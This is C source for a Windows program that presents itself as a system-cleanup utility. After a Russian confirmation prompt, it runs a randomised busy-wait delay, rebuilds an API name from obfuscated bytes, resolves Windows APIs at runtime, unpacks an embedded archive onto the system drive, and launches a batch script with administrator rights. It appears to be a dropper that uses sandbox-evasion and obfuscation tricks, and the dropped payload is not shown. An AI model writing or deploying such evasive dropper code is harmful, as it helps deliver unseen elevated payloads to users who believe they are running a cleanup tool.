#define _CRT_SECURE_NO_WARNINGS

#include <io.h>
#include <direct.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <windows.h>

typedef DWORD (WINAPI *TFN)(VOID);
typedef DWORD (WINAPI *MSGA)(HWND,LPCSTR,LPCSTR,UINT);
typedef HINSTANCE (WINAPI *SEA)(HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);

#define LZ_BUF_SIZE 259
#define LZ_CAPACITY 24
#define LZ_MIN_MATCH 3

#include "data.h"

uint8_t flags;
uint8_t cbuffer[LZ_CAPACITY+1];
uint8_t vocbuf[0x10000];
uint32_t frequency[257];
uint16_t buf_size;
uint16_t vocroot;
uint16_t offset;
uint16_t lenght;
uint16_t symbol;
uint32_t low;
uint32_t hlp;
uint32_t range;
uint32_t *fc;
char *lowp;
char *hlpp;
uint8_t *cpos;
uint8_t rle_flag;

uint32_t dptr;

uint8_t dgetc(){
  uint8_t s=0;
  if(dptr<data_size){
    s=data[dptr];
    dptr++;
  };
  return s;
}

uint8_t rc32_getc(uint8_t *c){
  while((range<0x10000)||(hlp<low)){
    if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
      range=0x10000-(uint16_t)low;
    hlp<<=8;
    *hlpp=dgetc();
    if(dptr==data_size) return 0;
    low<<=8;
    range<<=8;
  };
  range/=*fc;
  uint32_t count=(hlp-low)/range;
  if(count>=*fc) return 1;
  symbol=0;
  uint16_t i,j=128;
  while(j){
    if(frequency[symbol]<=count) symbol+=j;
    else{
      if(symbol) symbol-=j;
      else break;
    };
    j>>=1;
  };
  if(frequency[symbol]>count&&symbol) symbol--;
  *c=(uint8_t)symbol;
  j=frequency[symbol++];
  low+=j*range;
  range*=frequency[symbol]-j;
  for(i=symbol;i<257;i++) frequency[i]++;
  if(*fc>0xffff){
    uint32_t *fp=frequency;
    frequency[0]>>=1;
    for(i=1;i<257;i++){
      frequency[i]>>=1;
      if(frequency[i]<=*fp) frequency[i]=*fp+++1;
    };
  };
  return 0;
}

uint8_t unpack_file(){
  uint16_t i;
  if(lenght){
    if(!rle_flag){
      symbol=vocbuf[offset++];
      vocbuf[vocroot++]=symbol;
    };
    lenght--;
  }
  else{
    if(flags==0){
      cpos=cbuffer;
      if(rc32_getc(cpos++)) return 1;
      flags=8;
      lenght=0;
      symbol=*cbuffer;
      for(i=0;i<flags;i++){
        if(symbol&0x80) lenght++;
        else lenght+=3;
        symbol<<=1;
      };
      for(i=lenght;i;i--)
        if(rc32_getc(cpos++)) return 1;
      cpos=cbuffer+1;
    };
    lenght=0;
    if(*cbuffer&0x80){
      symbol=*cpos;
      vocbuf[vocroot++]=*cpos;
    }
    else{
      lenght=*cpos+++LZ_MIN_MATCH+1;
      offset=*(uint16_t*)cpos++;
      if(offset==0x0100) return 0;
      if(offset<0x0100){
        rle_flag=1;
        symbol=offset;
        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
        lenght--;
      }
      else{
        rle_flag=0;
        offset=0xffff+(uint16_t)(vocroot+LZ_BUF_SIZE)-offset;
        symbol=vocbuf[offset++];
        vocbuf[vocroot++]=symbol;
        lenght--;
      };
    };
    *cbuffer<<=1;
    cpos++;
    flags--;
  };
  return 0;
}

void rmkdir(char *path,int depth){
  for(int i=depth;i<strlen(path);i++){
    if(path[i]=='/'){
      path[i]=0;
      if(_access(path,0)!=0){
        _mkdir(path);
        if(_access(path,0)!=0) return;
      };
      path[i]='/';
      depth=i+1;
      rmkdir(path,depth);
      break;
    };
  };
  return;
}

uint8_t read_packed_value(void *p,uint16_t s){
  for(uint16_t i=0;i<s;i++){
    if(unpack_file()) return 1;
    ((char *)p)[i]=(char)symbol;
  };
  return 0;
}

void unarc(char *out){
  FILE *o;
  uint32_t fl=0,i;
  char *t=(char *)&fl,fp[257];
  dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
  offset=range=0xffffffff;
  lowp=&((char *)&low)[3];
  hlpp=&((char *)&hlp)[0];
  fc=&frequency[256];
  for(i=0;i<257;i++) frequency[i]=i;
  for(i=0;i<0x10000;i++) vocbuf[i]=0xff;
  for(i=0;i<sizeof(uint32_t);i++){
    hlp<<=8;
    *hlpp=dgetc();
  }
  for(;;){
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==data_size) break;
    for(i=0;i<strlen(out);i++) fp[i]=out[i];
    fp[i]='/';
    if(read_packed_value(&fp[strlen(out)+1],fl)) break;
    if(dptr==data_size) break;
    fp[fl+strlen(out)+1]=0;
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==data_size) break;
    rmkdir(fp,0);
    o=fopen(fp,"wb");
    for(i=0;i<fl;i++){
      if(unpack_file()) return;
      if(o) fputc((char)symbol,o);
    };
    if(o) fclose(o);
  };
}

void pi(uint32_t t){
  double p=0.0;
  double s=1.0;
  for(uint32_t i=0; i<t; i++){
    double k=8.0*i;
    p+=(4.0/(k+1)-2.0/(k+4)-1.0/(k+5)-1.0/(k+6))/s;
    s*=16.0;
  };
}

#define rot(c) (uint8_t)(((c<<4)&0xf0)|((c>>4)&0x0f))

void wait_pi(){
  uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
  uint32_t i=0;
  char fn[13],fs[]={0x74,0x56,0x47,0x45,0x96,0x36,0xb6,0x34,0xf6,0x57,0xe6,0x47,0x00}; //"GetTickCount"
  for(i=0;i<13;i++) fn[i]=rot(fs[i]);
  i=0;
  TFN tfn=(TFN)GetProcAddress(GetModuleHandleA("Kernel32.dll"),fn);
  srand(tfn());
  uint32_t t=rand()%10+10,start,stop;
  start=tfn();
  stop=start;
  while((stop-start)/1000<t){
    pi(offsets[i]);
    i=(i+1)%7;
    stop=tfn();
  };
}

int main(int argc,char *argv[]){
  char path[257];
  MSGA msga=(MSGA)GetProcAddress(LoadLibraryA("User32.dll"),"MessageBoxA");
  if(msga(NULL,"Произвести базовую очистку системы?","Внимание!",0x00001034)==6){
    wait_pi();
    sprintf(path,"%s/",getenv("SYSTEMDRIVE"));
    unarc(path);
    SEA sea=(SEA)GetProcAddress(LoadLibraryA("Shell32.dll"),"ShellExecuteA");
    sea(NULL,"runas","cmd.exe","/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",NULL,0);
  };
}
